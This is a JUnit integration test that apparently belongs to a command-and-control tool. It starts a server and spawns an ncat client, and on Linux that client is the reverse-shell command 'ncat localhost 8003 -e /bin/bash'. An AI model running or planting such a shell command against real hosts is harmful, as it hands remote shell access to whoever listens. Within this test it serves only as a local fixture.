package c2.nativeshell;

import java.io.IOException;

import org.junit.jupiter.api.Test;

import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;
import util.test.TestConstants;

class NcatIntegrationTest extends ClientServerTest {

	@Test
	void test() {
		try {
			Runtime.getRuntime().exec("ncat");
		} catch (IOException e) {
			System.out.println("ncat not available on this host, skipping ncat integration test sequence");
			return;
		}
		if (System.getProperty("os.name").contains("Windows")) {
			initiateServer();
			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
		} else {
			initiateServer("test_linux.properties");
			spawnClient("ncat localhost 8003 -e /bin/bash");
		}
		RunnerTestGeneric.test(new TestConfiguration(TestConfiguration.getThisSystemOS(), "Native", "TCP"));
		awaitClient();
		teardown();
	}

}
